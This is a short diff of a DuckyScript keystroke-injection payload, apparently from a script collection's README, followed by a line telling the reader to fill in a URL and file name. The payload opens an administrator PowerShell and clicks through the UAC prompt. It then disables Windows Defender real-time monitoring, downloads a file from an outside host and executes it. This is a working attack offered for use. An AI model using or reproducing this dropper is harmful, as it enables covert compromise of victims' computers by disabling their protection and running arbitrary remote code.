@@ -9,13 +9,10 @@ DELAY 200
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 1000
+ALT y
 DELAY 1000
-ALT y 
-DELAY 200
-STRING Set-MpPreference -DisableRealtimeMonitoring $true
+STRING $down = New-Object System.Net.WebClient; $url = 'URL_GOES_HERE'; $file = 'FILE_NAME_OUTPUT'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; Set-MpPreference -DisableRealtimeMonitoring $true; $exec.shellexecute($file); exit;
 ENTER
-DELAY 1200
-STRING $down = New-Object System.Net.WebClient; $url = 'URL_GOES_HERE'; $file = 'FILE_NAME_OUTPUT'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ```
 
 Make sure to change URL_GOES_HERE and FILE_NAME_OUTPUT on the script in order for this to work.
